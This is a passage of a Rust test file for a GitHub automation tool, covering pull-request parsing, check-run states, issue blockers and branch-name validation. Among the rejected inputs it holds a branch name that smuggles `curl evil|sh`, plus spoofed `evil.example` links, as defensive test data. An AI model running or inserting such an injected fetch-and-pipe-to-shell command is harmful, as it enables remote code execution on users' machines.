                head_sha: HEAD_SHA.into(),
                mergeable: Mergeable::Mergeable,
                created_at: "2026-10-29T05:50:00Z".into(),
            })
        );
    }

    #[test]
    fn pull_request_reads_githubs_mergeable_state_and_anything_else_as_unknown() {
        for (raw, mergeable) in [
            ("MERGEABLE", Mergeable::Mergeable),
            ("CONFLICTING", Mergeable::Conflicting),
            ("UNKNOWN", Mergeable::Unknown),
            ("SOMETHING_NEW", Mergeable::Unknown),
        ] {
            let fake = FakeTracker::answering([Answer::ok(
                PR_VIEW.replace("\"MERGEABLE\"", &format!("\"{raw}\"")),
            )]);
            let pr = pull_request(&fake, REPO, 2).unwrap().unwrap();
            assert_eq!(fake.calls(), vec![pr_view_call("2")], "{raw}");
            assert_eq!(pr.mergeable, mergeable, "{raw}");
        }
    }

    #[test]
    fn pull_request_says_when_it_is_merged_and_is_then_not_open() {
        let merged = FakeTracker::answering([Answer::ok(
            PR_VIEW.replace("\"state\":\"OPEN\"", "\"state\":\"MERGED\""),
        )]);
        let pr = pull_request(&merged, REPO, 2).unwrap().unwrap();
        assert!(pr.merged);
        assert!(!pr.open);
        let closed = FakeTracker::answering([Answer::ok(
            PR_VIEW.replace("\"state\":\"OPEN\"", "\"state\":\"CLOSED\""),
        )]);
        let other = pull_request(&closed, REPO, 2).unwrap().unwrap();
        assert!(!other.merged);
        assert!(!other.open);
    }

    #[test]
    fn pull_request_from_a_fork_and_into_another_base_says_so() {
        let fake = FakeTracker::answering([Answer::ok(format!(
            "{{\"createdAt\":\"2026-10-29T05:50:00Z\",\"baseRefName\":\"release/1.0\",\"headRefName\":\"t3code/x\",\"headRefOid\":\"{HEAD_SHA}\",\"isCrossRepository\":true,\"isDraft\":true,\"mergeable\":\"MERGEABLE\",\"number\":4,\"state\":\"OPEN\"}}"
        ))]);
        let pr = pull_request(&fake, REPO, 4).unwrap().unwrap();
        assert!(pr.cross_repository);
        assert_eq!(pr.base_ref, "release/1.0");
        assert_eq!(pr.head_ref, "t3code/x");
    }

    #[test]
    fn a_pull_request_view_without_the_fork_or_base_fields_is_a_parse_error() {
        let fake = FakeTracker::answering([Answer::ok(format!(
            "{{\"createdAt\":\"2026-10-29T05:50:00Z\",\"headRefName\":\"x\",\"headRefOid\":\"{HEAD_SHA}\",\"isDraft\":true,\"mergeable\":\"MERGEABLE\",\"number\":3,\"state\":\"OPEN\"}}"
        ))]);
        assert!(is_parse(&pull_request(&fake, REPO, 3).unwrap_err()));
    }

    #[test]
    fn a_pull_request_view_without_the_head_commit_is_a_parse_error() {
        let fake = FakeTracker::answering([Answer::ok(
            "{\"createdAt\":\"2026-10-29T05:50:00Z\",\"baseRefName\":\"main\",\"headRefName\":\"x\",\"isCrossRepository\":false,\"isDraft\":true,\"mergeable\":\"MERGEABLE\",\"number\":3,\"state\":\"OPEN\"}",
        )]);
        assert!(is_parse(&pull_request(&fake, REPO, 3).unwrap_err()));
    }

    #[test]
    fn pull_request_reads_the_head_commit_as_given() {
        let sha = "0123456789abcdef0123456789abcdef01234567";
        let fake = FakeTracker::answering([Answer::ok(format!(
            "{{\"createdAt\":\"2026-10-29T05:50:00Z\",\"baseRefName\":\"main\",\"headRefName\":\"x\",\"headRefOid\":\"{sha}\",\"isCrossRepository\":false,\"isDraft\":true,\"mergeable\":\"MERGEABLE\",\"number\":3,\"state\":\"OPEN\"}}"
        ))]);
        assert_eq!(pull_request(&fake, REPO, 3).unwrap().unwrap().head_sha, sha);
    }

    #[test]
    fn a_pull_request_whose_creation_time_is_not_a_utc_second_is_a_parse_error() {
        for at in [
            "",
            "2026-10-29T05:50:00+10:00",
            "2026-10-29T05:50:00.5Z",
            "yesterday",
        ] {
            let fake =
                FakeTracker::answering([Answer::ok(PR_VIEW.replace("2026-10-29T05:50:00Z", at))]);
            let error = pull_request(&fake, REPO, 2).unwrap_err();
            assert!(is_parse(&error), "{at}: {error}");
        }
    }

    #[test]
    fn a_pull_request_whose_head_commit_is_not_a_full_id_is_a_parse_error() {
        for sha in [
            String::new(),
            "4f1c2d3".to_string(),
            format!("{HEAD_SHA}0"),
            HEAD_SHA.replace('4', "g"),
        ] {
            let fake = FakeTracker::answering([Answer::ok(PR_VIEW.replace(HEAD_SHA, &sha))]);
            let error = pull_request(&fake, REPO, 2).unwrap_err();
            assert!(is_parse(&error), "{sha}: {error}");
        }
    }

    #[test]
    fn pull_request_merged_and_closed_are_not_open() {
        for state in ["MERGED", "CLOSED"] {
            let fake = FakeTracker::answering([Answer::ok(pr_view(state, false))]);
            let pr = pull_request(&fake, REPO, 9).unwrap().unwrap();
            assert!(!pr.open, "{state}");
            assert!(!pr.is_draft, "{state}");
        }
    }

    #[test]
    fn a_pull_request_that_does_not_exist_is_null() {
        for stderr in [
            "GraphQL: Could not resolve to a PullRequest with the number of 999. (repository.pullRequest)\n",
            "graphql: could not resolve to a pullrequest with the number of 999.",
            "GRAPHQL: COULD NOT RESOLVE TO A PULLREQUEST",
        ] {
            let fake = FakeTracker::answering([Answer::fail(1, stderr)]);
            assert_eq!(pull_request(&fake, REPO, 999).unwrap(), None, "{stderr}");
        }
    }

    #[test]
    fn any_other_pull_request_failure_stays_an_error() {
        for stderr in [
            "HTTP 502: Bad Gateway",
            "Could not resolve host: api.github.com",
            "Could not resolve to an Issue with the number of 5.",
            "",
        ] {
            let fake = FakeTracker::answering([Answer::fail(1, stderr)]);
            let error = pull_request(&fake, REPO, 999).unwrap_err();
            assert!(is_failed(&error), "{stderr}: {error}");
            assert!(error.to_string().contains("status 1"), "{stderr}: {error}");
        }
        let fake = FakeTracker::new();
        let error = pull_request(&fake, REPO, 999).unwrap_err();
        assert!(
            matches!(&error, TrackerError::Other(m) if m.contains("cannot start")),
            "{error}"
        );
    }

    #[test]
    fn pull_request_errors_are_typed() {
        let failed = FakeTracker::answering([Answer::fail(1, "no pull requests found")]);
        assert!(is_failed(&pull_request(&failed, REPO, 2).unwrap_err()));
        let parse = FakeTracker::answering([Answer::ok("{}")]);
        assert!(is_parse(&pull_request(&parse, REPO, 2).unwrap_err()));
    }

    #[test]
    fn issue_and_pull_request_calls_use_the_number_they_are_given() {
        let fake = FakeTracker::answering([
            Answer::ok(issue_json(&["factory:ready"], &[], "\"b\"")),
            Answer::ok(pr_view("OPEN", true)),
        ]);
        issue(&fake, REPO, 7).unwrap();
        pull_request(&fake, REPO, 3).unwrap();
        assert_eq!(fake.calls(), vec![issue_view_call("7"), pr_view_call("3")]);
    }

    // Checks.

    fn run(name: &str, status: &str, conclusion: Option<&str>) -> serde_json::Value {
        serde_json::json!({
            "id": 1,
            "name": name,
            "status": status,
            "conclusion": conclusion,
            "html_url": format!("https://github.com/rawphp/softfac/actions/runs/1/job/{name}"),
            "app": {"slug": "github-actions"},
        })
    }

    fn with_url(mut run: serde_json::Value, url: serde_json::Value) -> serde_json::Value {
        run["html_url"] = url;
        run
    }

    fn page(runs: &[serde_json::Value]) -> String {
        serde_json::Value::Array(runs.to_vec()).to_string()
    }

    fn checks_call() -> Vec<String> {
        args(&[
            "api",
            &format!(
                "repos/rawphp/softfac/commits/{BASE_SHA}/check-runs?per_page=100&filter=latest"
            ),
            "--paginate",
            "--jq",
            "[.check_runs[] | {name, status, conclusion, html_url}]",
        ])
    }

    fn names(names: &[&str]) -> Vec<String> {
        args(names)
    }

    /// The one check `gate` over `runs`.
    fn gate(runs: &[serde_json::Value]) -> CheckStatus {
        let fake = FakeTracker::answering([Answer::ok(page(runs))]);
        checks(&fake, REPO, BASE_SHA, &names(&["gate"]))
            .unwrap()
            .remove(0)
    }

    #[test]
    fn checks_reads_the_check_runs_of_the_commit_with_the_exact_call() {
        let fake = FakeTracker::answering([Answer::ok(page(&[run(
            "gate",
            "completed",
            Some("success"),
        )]))]);
        let got = checks(&fake, REPO, BASE_SHA, &names(&["gate"])).unwrap();
        assert_eq!(fake.calls(), vec![checks_call()]);
        assert_eq!(
            got,
            vec![CheckStatus {
                name: "gate".into(),
                state: CheckState::Passed,
                conclusion: "success".into(),
                url: Some("https://github.com/rawphp/softfac/actions/runs/1/job/gate".into()),
            }]
        );
    }

    #[test]
    fn checks_answers_for_each_name_asked_in_the_order_asked_and_ignores_other_runs() {
        let fake = FakeTracker::answering([Answer::ok(page(&[
            run("lint", "completed", Some("success")),
            run("other", "completed", Some("failure")),
            run("gate", "completed", Some("success")),
        ]))]);
        let got = checks(&fake, REPO, BASE_SHA, &names(&["gate", "lint"])).unwrap();
        assert_eq!(
            got.iter()
                .map(|c| (c.name.as_str(), c.state))
                .collect::<Vec<_>>(),
            vec![("gate", CheckState::Passed), ("lint", CheckState::Passed)]
        );
    }

    #[test]
    fn a_completed_run_passes_on_success_and_neutral_and_fails_on_anything_else() {
        for conclusion in ["success", "neutral"] {
            let got = gate(&[run("gate", "completed", Some(conclusion))]);
            assert_eq!(got.state, CheckState::Passed, "{conclusion}");
        }
        for conclusion in [
            "failure",
            "cancelled",
            "timed_out",
            "action_required",
            "stale",
            "startup_failure",
            "something_new",
        ] {
            let got = gate(&[run("gate", "completed", Some(conclusion))]);
            assert_eq!(got.state, CheckState::Failed, "{conclusion}");
            assert_eq!(got.conclusion, conclusion);
        }
        // Completed with no conclusion is not a pass.
        let got = gate(&[run("gate", "completed", None)]);
        assert_eq!(got.state, CheckState::Failed);
        assert_eq!(got.conclusion, "completed");
    }

    #[test]
    fn a_run_that_has_not_completed_is_pending() {
        for status in ["queued", "in_progress", "waiting", "pending", "requested"] {
            let got = gate(&[run("gate", status, None)]);
            assert_eq!(got.state, CheckState::Pending, "{status}");
            assert_eq!(got.conclusion, status);
        }
    }

    #[test]
    fn a_check_with_no_run_is_missing_and_not_pending() {
        let fake = FakeTracker::answering([Answer::ok("[]")]);
        let got = checks(&fake, REPO, BASE_SHA, &names(&["gate"])).unwrap();
        assert_eq!(
            got,
            vec![CheckStatus {
                name: "gate".into(),
                state: CheckState::Missing,
                conclusion: String::new(),
                url: None,
            }]
        );
    }

    #[test]
    fn a_name_that_is_not_exactly_the_runs_is_missing() {
        let got = gate(&[run("Gate", "completed", Some("success"))]);
        assert_eq!(got.state, CheckState::Missing);
    }

    #[test]
    fn a_skipped_run_is_not_a_result_so_the_check_stays_missing() {
        // The factory's pull request is a draft until the checks pass, and a job guarded by
        // "not a draft" is skipped on it: nothing ran, so nothing passed.
        let got = gate(&[run("gate", "completed", Some("skipped"))]);
        assert_eq!(got.state, CheckState::Missing);
        assert_eq!(got.conclusion, "skipped");
    }

    #[test]
    fn several_runs_of_one_name_fail_before_they_pend_and_pend_before_they_pass() {
        type Run = (&'static str, Option<&'static str>);
        let state = |a: Run, b: Run| gate(&[run("gate", a.0, a.1), run("gate", b.0, b.1)]).state;
        let success: Run = ("completed", Some("success"));
        let neutral: Run = ("completed", Some("neutral"));
        let failure: Run = ("completed", Some("failure"));
        let skipped: Run = ("completed", Some("skipped"));
        let going: Run = ("in_progress", None);
        assert_eq!(state(success, failure), CheckState::Failed);
        // The conclusion and the link are the deciding run's, whichever came first.
        let mixed = gate(&[
            run("gate", "completed", Some("success")),
            with_url(
                run("gate", "completed", Some("failure")),
                "https://github.com/x/y/runs/2".into(),
            ),
        ]);
        assert_eq!(
            mixed,
            CheckStatus {
                name: "gate".into(),
                state: CheckState::Failed,
                conclusion: "failure".into(),
                url: Some("https://github.com/x/y/runs/2".into()),
            }
        );
        assert_eq!(state(going, success), CheckState::Pending);
        assert_eq!(state(success, neutral), CheckState::Passed);
        // A failure is not hidden by a run that is going again, in either order.
        assert_eq!(state(failure, going), CheckState::Failed);
        assert_eq!(state(going, failure), CheckState::Failed);
        // One skipped run among passing ones is not every run passing.
        assert_eq!(state(success, skipped), CheckState::Missing);
        assert_eq!(state(skipped, success), CheckState::Missing);
        // A skipped run does not hide one that is still going, or one that failed.
        assert_eq!(state(skipped, going), CheckState::Pending);
        assert_eq!(state(going, skipped), CheckState::Pending);
        assert_eq!(state(skipped, failure), CheckState::Failed);
        assert_eq!(state(failure, skipped), CheckState::Failed);
    }

    #[test]
    fn of_several_runs_that_decide_alike_the_first_one_listed_is_reported() {
        let got = gate(&[
            with_url(
                run("gate", "completed", Some("failure")),
                "https://github.com/x/y/runs/1".into(),
            ),
            with_url(
                run("gate", "completed", Some("cancelled")),
                "https://github.com/x/y/runs/2".into(),
            ),
        ]);
        assert_eq!(
            got,
            CheckStatus {
                name: "gate".into(),
                state: CheckState::Failed,
                conclusion: "failure".into(),
                url: Some("https://github.com/x/y/runs/1".into()),
            }
        );
    }

    #[test]
    fn checks_reads_every_page() {
        let fake = FakeTracker::answering([Answer::ok(format!(
            "{}\n{}",
            page(&[run("gate", "completed", Some("success"))]),
            page(&[run("lint", "in_progress", None)])
        ))]);
        let got = checks(&fake, REPO, BASE_SHA, &names(&["gate", "lint"])).unwrap();
        assert_eq!(got[0].state, CheckState::Passed);
        assert_eq!(got[1].state, CheckState::Pending);
    }

    #[test]
    fn checks_keeps_a_details_link_only_when_it_is_a_github_one() {
        for url in [
            "https://evil.example/x",
            "https://github.com.evil.example/x",
            "http://github.com/x",
        ] {
            let got = gate(&[with_url(
                run("gate", "completed", Some("failure")),
                url.into(),
            )]);
            assert_eq!(got.url, None, "{url}");
        }
        let none = gate(&[with_url(
            run("gate", "completed", Some("failure")),
            serde_json::Value::Null,
        )]);
        assert_eq!(none.url, None);
    }

    #[test]
    fn checks_refuses_a_commit_that_is_not_a_full_id_before_any_call() {
        for sha in [
            String::new(),
            "main".to_string(),
            "9f8e7d6".to_string(),
            "../x".to_string(),
            BASE_SHA.replace('9', "g"),
        ] {
            let fake = FakeTracker::answering([Answer::ok("[]")]);
            let error = checks(&fake, REPO, &sha, &names(&["gate"])).unwrap_err();
            assert!(is_refused(&error), "{sha}: {error}");
            assert!(fake.calls().is_empty(), "{sha}");
        }
    }

    #[test]
    fn checks_refuses_an_answer_that_is_not_a_list_of_runs() {
        for answer in ["{}", "not json", "[{\"name\":\"gate\"}]"] {
            let fake = FakeTracker::answering([Answer::ok(answer)]);
            let error = checks(&fake, REPO, BASE_SHA, &names(&["gate"])).unwrap_err();
            assert!(is_parse(&error), "{answer}: {error}");
        }
    }

    #[test]
    fn checks_that_gh_cannot_read_is_the_gh_failure() {
        let fake = FakeTracker::answering([Answer::fail(1, "gh: Not Found (HTTP 404)")]);
        let error = checks(&fake, REPO, BASE_SHA, &names(&["gate"])).unwrap_err();
        assert!(matches!(error, TrackerError::NotFound { .. }), "{error}");
    }

    // Blockers.

    fn blocked_by_call(issue: &str) -> Vec<String> {
        args(&[
            "api",
            &format!("repos/rawphp/softfac/issues/{issue}/dependencies/blocked_by"),
            "--paginate",
        ])
    }

    fn blocker_row(number: u64, state: &str, repo: &str) -> String {
        format!(
            "{{\"id\":{number},\"number\":{number},\"state\":\"{state}\",\"title\":\"t\",\"repository_url\":\"https://api.github.com/repos/{repo}\",\"labels\":[]}}"
        )
    }

    fn open_blocker(number: u64, repo: &str) -> Blocker {
        Blocker {
            repo: repo.into(),
            number,
        }
    }

    #[test]
    fn an_issue_with_no_blockers_has_no_open_blockers() {
        let fake = FakeTracker::answering([Answer::ok("[]")]);
        assert_eq!(open_blockers(&fake, REPO, 14).unwrap(), vec![]);
        assert_eq!(fake.calls(), vec![blocked_by_call("14")]);
    }

    #[test]
    fn a_closed_blocker_is_resolved_whatever_closed_it() {
        let fake = FakeTracker::answering([Answer::ok(format!(
            "[{},{}]",
            blocker_row(13, "closed", "rawphp/softfac"),
            blocker_row(12, "closed", "rawphp/other")
        ))]);
        assert_eq!(open_blockers(&fake, REPO, 14).unwrap(), vec![]);
    }

    #[test]
    fn only_the_exact_rest_state_closed_resolves_a_blocker_any_other_state_still_blocks() {
        let fake = FakeTracker::answering([Answer::ok(format!(
            "[{},{},{}]",
            blocker_row(13, "unknown", "rawphp/softfac"),
            blocker_row(12, "CLOSED", "rawphp/softfac"),
            blocker_row(11, "closed", "rawphp/softfac")
        ))]);
        assert_eq!(
            open_blockers(&fake, REPO, 14).unwrap(),
            vec![
                open_blocker(13, "rawphp/softfac"),
                open_blocker(12, "rawphp/softfac")
            ]
        );
    }

    #[test]
    fn open_blockers_keep_the_repo_they_are_in() {
        let fake = FakeTracker::answering([Answer::ok(format!(
            "[{},{},{}]",
            blocker_row(13, "open", "rawphp/softfac"),
            blocker_row(12, "closed", "rawphp/softfac"),
            blocker_row(7, "open", "acme/widgets")
        ))]);
        assert_eq!(
            open_blockers(&fake, REPO, 14).unwrap(),
            vec![
                open_blocker(13, "rawphp/softfac"),
                open_blocker(7, "acme/widgets")
            ]
        );
    }

    #[test]
    fn blockers_on_every_page_are_read() {
        // `gh api --paginate` may print each page as its own array.
        let fake = FakeTracker::answering([Answer::ok(format!(
            "[{}][{}]",
            blocker_row(1, "closed", "rawphp/softfac"),
            blocker_row(2, "open", "rawphp/softfac")
        ))]);
        assert_eq!(
            open_blockers(&fake, REPO, 14).unwrap(),
            vec![open_blocker(2, "rawphp/softfac")]
        );
    }

    #[test]
    fn blockers_that_cannot_be_read_are_an_error() {
        let spawn = FakeTracker::new();
        let error = open_blockers(&spawn, REPO, 14).unwrap_err();
        assert!(
            matches!(&error, TrackerError::Other(m) if m.contains("cannot start")),
            "{error}"
        );

        let failed = FakeTracker::answering([Answer::fail(1, "Not Found")]);
        assert!(is_failed(&open_blockers(&failed, REPO, 14).unwrap_err()));

        for stdout in ["oops", "", "{\"message\":\"x\"}"] {
            let fake = FakeTracker::answering([Answer::ok(stdout)]);
            let error = open_blockers(&fake, REPO, 14).unwrap_err();
            assert!(is_parse(&error), "{stdout}: {error}");
        }
    }

    #[test]
    fn an_open_blocker_whose_repo_is_unknown_is_an_error_not_a_guess() {
        for row in [
            "{\"number\":3,\"state\":\"open\"}",
            "{\"number\":3,\"state\":\"open\",\"repository_url\":\"x\"}",
        ] {
            let fake = FakeTracker::answering([Answer::ok(format!("[{row}]"))]);
            let error = open_blockers(&fake, REPO, 14).unwrap_err();
            assert!(is_parse(&error), "{row}: {error}");
        }
    }

    fn body_call(issue: &str) -> Vec<String> {
        args(&["issue", "view", issue, "--repo", REPO, "--json", "body"])
    }

    fn rest_call(repo: &str, issue: &str) -> Vec<String> {
        args(&["api", &format!("repos/{repo}/issues/{issue}")])
    }

    fn body_reply(body: &str) -> String {
        serde_json::json!({ "body": body }).to_string()
    }

    #[test]
    fn text_blockers_of_a_body_without_the_section_read_nothing_more() {
        let fake = FakeTracker::answering([Answer::ok(body_reply("## Cause\nSee #5\n"))]);
        assert_eq!(text_blockers(&fake, REPO, 14).unwrap(), vec![]);
        assert_eq!(fake.calls(), vec![body_call("14")]);

        let empty = FakeTracker::answering([Answer::ok("{\"body\":null}")]);
        assert_eq!(text_blockers(&empty, REPO, 14).unwrap(), vec![]);
    }

    #[test]
    fn text_blockers_are_the_named_issues_that_are_not_closed() {
        let fake = FakeTracker::answering([
            Answer::ok(body_reply(
                "## Depends on\n#13, acme/widgets#7 and #5\n\n## Fix\n#99\n",
            )),
            Answer::ok("{\"number\":13,\"state\":\"open\",\"title\":\"t\"}"),
            Answer::ok("{\"number\":7,\"state\":\"closed\"}"),
            Answer::ok("{\"number\":5,\"state\":\"open\"}"),
        ]);
        assert_eq!(
            text_blockers(&fake, REPO, 14).unwrap(),
            vec![open_blocker(13, REPO), open_blocker(5, REPO)]
        );
        assert_eq!(
            fake.calls(),
            vec![
                body_call("14"),
                rest_call(REPO, "13"),
                rest_call("acme/widgets", "7"),
                rest_call(REPO, "5"),
            ]
        );
    }

    #[test]
    fn text_blockers_resolved_once_every_named_issue_is_closed() {
        let fake = FakeTracker::answering([
            Answer::ok(body_reply("## Depends on\n#13\n")),
            Answer::ok("{\"state\":\"closed\"}"),
        ]);
        assert_eq!(text_blockers(&fake, REPO, 14).unwrap(), vec![]);
    }

    #[test]
    fn only_the_exact_rest_state_closed_resolves_a_named_issue_any_other_still_blocks() {
        let fake = FakeTracker::answering([
            Answer::ok(body_reply("## Depends on\n#13, #12, #11\n")),
            Answer::ok("{\"state\":\"CLOSED\"}"),
            Answer::ok("{\"state\":\"unknown\"}"),
            Answer::ok("{\"state\":\"closed\"}"),
        ]);
        assert_eq!(
            text_blockers(&fake, REPO, 14).unwrap(),
            vec![open_blocker(13, REPO), open_blocker(12, REPO)]
        );
    }

    #[test]
    fn a_depends_on_section_naming_more_than_the_cap_is_an_error_before_any_is_read() {
        let refs = |count: usize| {
            (1..=count)
                .map(|at| format!("#{at}"))
                .collect::<Vec<_>>()
                .join(" ")
        };

        let over = FakeTracker::answering([Answer::ok(body_reply(&format!(
            "## Depends on\n{}\n",
            refs(MAX_DEPENDS_ON + 1)
        )))]);
        assert!(is_parse(&text_blockers(&over, REPO, 14).unwrap_err()));
        assert_eq!(over.calls(), vec![body_call("14")]);

        let at_cap = FakeTracker::answering(
            std::iter::once(Answer::ok(body_reply(&format!(
                "## Depends on\n{}\n",
                refs(MAX_DEPENDS_ON)
            ))))
            .chain((0..MAX_DEPENDS_ON).map(|_| Answer::ok("{\"state\":\"closed\"}"))),
        );
        assert_eq!(text_blockers(&at_cap, REPO, 14).unwrap(), vec![]);
        assert_eq!(at_cap.calls().len(), MAX_DEPENDS_ON + 1);
    }

    #[test]
    fn a_named_issue_that_cannot_be_read_is_an_error_not_a_resolved_blocker() {
        let body = body_reply("## Depends on\n#13, #5\n");
        let missing = FakeTracker::answering([
            Answer::ok(body.clone()),
            Answer::ok("{\"state\":\"closed\"}"),
            Answer::fail(1, "gh: Not Found (HTTP 404)"),
        ]);
        let error = text_blockers(&missing, REPO, 14).unwrap_err();
        assert!(matches!(error, TrackerError::NotFound { .. }), "{error}");

        let oops = FakeTracker::answering([Answer::ok(body.clone()), Answer::ok("oops")]);
        assert!(is_parse(&text_blockers(&oops, REPO, 14).unwrap_err()));

        let empty = FakeTracker::answering([Answer::ok(body), Answer::ok("{}")]);
        assert!(is_parse(&text_blockers(&empty, REPO, 14).unwrap_err()));
    }

    #[test]
    fn a_body_that_cannot_be_read_is_an_error() {
        let failed = FakeTracker::answering([Answer::fail(1, "boom")]);
        assert!(is_failed(&text_blockers(&failed, REPO, 14).unwrap_err()));
        let oops = FakeTracker::answering([Answer::ok("oops")]);
        assert!(is_parse(&text_blockers(&oops, REPO, 14).unwrap_err()));
    }

    // Pull requests on a head.

    const PR_LIST_FIELDS: &str = "number,url,headRefName,baseRefName,isCrossRepository,author";

    fn listed_pr(number: u64, head: &str) -> String {
        serde_json::json!({
            "number": number,
            "url": format!("https://github.com/rawphp/softfac/pull/{number}"),
            "state": "OPEN",
            "headRefName": head,
            "baseRefName": "main",
            "isCrossRepository": false,
            "author": {"login": "rawphp"},
        })
        .to_string()
    }

    fn pr_list_call(head: &str) -> Vec<String> {
        args(&[
            "pr",
            "list",
            "--repo",
            REPO,
            "--state",
            "open",
            "--head",
            head,
            "--limit",
            "100",
            "--json",
            PR_LIST_FIELDS,
        ])
    }

    #[test]
    fn open_pull_requests_on_head_lists_the_open_pull_requests_from_the_branch_with_the_exact_call()
    {
        // `gh pr list --json author` carries more than the login; a blank login is nobody.
        let second = serde_json::json!({
            "number": 15,
            "url": "https://github.com/rawphp/softfac/pull/15",
            "headRefName": "t3code/abc",
            "baseRefName": "dev",
            "isCrossRepository": true,
            "author": {"id": "", "is_bot": false, "login": "", "name": ""},
        });
        let fake = FakeTracker::answering([Answer::ok(format!(
            "[{},{second}]",
            listed_pr(14, "t3code/abc")
        ))]);
        assert_eq!(
            open_pull_requests_on_head(&fake, REPO, "t3code/abc").unwrap(),
            vec![
                OpenPullRequest {
                    number: 14,
                    url: "https://github.com/rawphp/softfac/pull/14".into(),
                    head_ref: "t3code/abc".into(),
                    base_ref: "main".into(),
                    cross_repository: false,
                    author: Some("rawphp".into()),
                },
                OpenPullRequest {
                    number: 15,
                    url: "https://github.com/rawphp/softfac/pull/15".into(),
                    head_ref: "t3code/abc".into(),
                    base_ref: "dev".into(),
                    cross_repository: true,
                    author: None,
                },
            ]
        );
        assert_eq!(fake.calls(), vec![pr_list_call("t3code/abc")]);
    }

    #[test]
    fn open_pull_requests_on_head_names_a_bot_author_as_app_slash_login() {
        let bot = serde_json::json!({
            "number": 16,
            "url": "https://github.com/rawphp/softfac/pull/16",
            "headRefName": "t3code/abc",
            "baseRefName": "main",
            "isCrossRepository": false,
            "author": {"login": "dependabot", "__typename": "Bot"},
        });
        let fake = FakeTracker::answering([Answer::ok(format!("[{bot}]"))]);
        let got = open_pull_requests_on_head(&fake, REPO, "t3code/abc").unwrap();
        assert_eq!(got[0].author.as_deref(), Some("app/dependabot"));
    }

    #[test]
    fn open_pull_requests_on_head_is_empty_when_the_branch_has_none() {
        let fake = FakeTracker::answering([Answer::ok("[]")]);
        assert_eq!(
            open_pull_requests_on_head(&fake, REPO, "t3code/abc").unwrap(),
            vec![]
        );
    }

    #[test]
    fn open_pull_requests_on_head_refuses_a_branch_name_that_could_be_taken_for_an_option_before_calling_gh()
     {
        for head in ["-x", "--force", "a b", "a..b", "", "a\u{1}b"] {
            let fake = FakeTracker::answering([Answer::ok("[]")]);
            let error = open_pull_requests_on_head(&fake, REPO, head).unwrap_err();
            assert!(is_refused(&error), "{head:?}: {error}");
            assert!(fake.calls().is_empty(), "{head:?}");
        }
    }

    #[test]
    fn keep_a_plain_ref_name_safe_as_one_argument_to_git() {
        for name in ["t3code/abc", "feat/x;y", "t3/x`y`"] {
            assert!(is_plain_ref_name(name), "{name}");
        }
        for name in ["", "-x", "--force", "a b", "a..b", "a\u{1}b", "a\tb"] {
            assert!(!is_plain_ref_name(name), "{name:?}");
        }
    }

    #[test]
    fn let_only_an_ordinary_branch_name_into_a_command_a_session_runs() {
        for name in ["t3code/abc", "t3/2e8db933", "feat/x_y-z.1"] {
            assert!(is_safe_branch_name(name), "{name}");
        }
        for name in [
            "",
            "-x",
            "a b",
            "a..b",
            "feat/x;y",
            "t3/x`y`",
            "t3/x;$(curl evil|sh)",
        ] {
            assert!(!is_safe_branch_name(name), "{name:?}");
        }
    }

    #[test]
    fn a_branch_path_has_no_empty_or_dot_segment() {
        for name in ["main", "release/1.0", "a/b/c"] {
            assert!(is_branch_path(name), "{name}");
        }
        for name in ["", "..", "../x", "a/../b", "./x", "/x", "x//y", "x/"] {
            assert!(!is_branch_path(name), "{name:?}");
        }
    }

    #[test]
    fn open_pull_requests_on_head_refuses_an_answer_it_cannot_read() {
        for text in ["", "no", "{}", "[{\"number\":\"x\"}]"] {
            let fake = FakeTracker::answering([Answer::ok(text)]);
            let error = open_pull_requests_on_head(&fake, REPO, "t3code/abc").unwrap_err();
            assert!(is_parse(&error), "{text}: {error}");
        }
    }

    // ----- End of part A tests -----

    // ----- Part B tests -----

    use crate::factory::github::gh::command_text;
    use crate::factory::lifecycle::approval::Refusal;
    use serde_json::{Value, json};

    const REPO: &str = "rawphp/softfac";

    /// When the instructor applied `factory:ready` in most of the approval tests.
    const LABELED: &str = "2026-10-04T10:00:00Z";
    /// After LABELED, and before LATER.
    const AFTER: &str = "2026-10-04T10:30:00Z";
    const LATER: &str = "2026-10-04T11:00:00Z";
    /// When the issue was written: the oldest entry of the edit history, by its author.
    const CREATED: &str = "2026-10-04T08:00:00Z";
    const BEFORE: &str = "2026-10-04T09:00:00Z";
    const READY: &str = "factory:ready";

    /// A person by login, or an App (`Bot`) that carries a login, or no one.
    #[derive(Clone, Copy)]
    enum Who<'a> {
        User(&'a str),
        Bot(&'a str),
        Nobody,
    }

    impl<'a> From<&'a str> for Who<'a> {
        fn from(login: &'a str) -> Self {
            Who::User(login)
        }
    }

    const NOBODY: Who<'static> = Who::Nobody;

    /// A GitHub App whose GraphQL login matches an instructor's.
    fn bot(login: &str) -> Who<'_> {
        Who::Bot(login)
    }

    type Edit<'a> = (&'a str, Who<'a>);

    fn e<'a>(at: &'a str, who: impl Into<Who<'a>>) -> Edit<'a> {
        (at, who.into())
    }

    fn pad(n: usize) -> String {
        format!("{n:02}")
    }

    fn names(logins: &[&str]) -> Vec<String> {
        logins.iter().map(|login| login.to_string()).collect()
    }

    fn actor_of(who: Who) -> Value {
        match who {
            Who::Nobody => Value::Null,
            Who::User(login) => json!({"__typename": "User", "login": login}),
            Who::Bot(login) => json!({"__typename": "Bot", "login": login}),
        }
    }

    fn label_event(kind: &str, at: &str, actor: impl Into<Who<'static>>, label: &str) -> Value {
        json!({
            "__typename": kind,
            "createdAt": at,
            "actor": actor_of(actor.into()),
            "label": {"name": label},
        })
    }

    /// A RenamedTitleEvent: only who and when are asked for, never the titles.
    fn rename_event(at: &str, actor: impl Into<Who<'static>>) -> Value {
        json!({"__typename": "RenamedTitleEvent", "createdAt": at, "actor": actor_of(actor.into())})
    }

    fn ready_on(at: &str, actor: impl Into<Who<'static>>) -> Value {
        label_event("LabeledEvent", at, actor, READY)
    }

    fn ready_off(at: &str, actor: impl Into<Who<'static>>) -> Value {
        label_event("UnlabeledEvent", at, actor, READY)
    }

    /// `userContentEdits` as GitHub answers `first: 100`: newest first, with the real total.
    fn edits_json(newest_first: &[Edit], total: usize) -> Value {
        json!({
            "totalCount": total,
            "nodes": newest_first
                .iter()
                .map(|(at, who)| json!({"editedAt": at, "editor": actor_of(*who)}))
                .collect::<Vec<_>>(),
        })
    }

    /// A history written oldest first, as the tests think of it, in GitHub's order.
    fn newest_first<'a>(oldest_first: &[Edit<'a>]) -> Vec<Edit<'a>> {
        oldest_first.iter().rev().copied().collect()
    }

    /// The approval answer with exactly these history nodes (newest first) and this total.
    fn approval_reply_raw(
        events: &[Value],
        total_events: usize,
        last: Option<Edit>,
        edit_nodes: &[Edit],
        total_edits: usize,
    ) -> String {
        json!({"data": {"repository": {"issue": {
            "timelineItems": {"totalCount": total_events, "nodes": events},
            "lastEditedAt": last.map(|(at, _)| at),
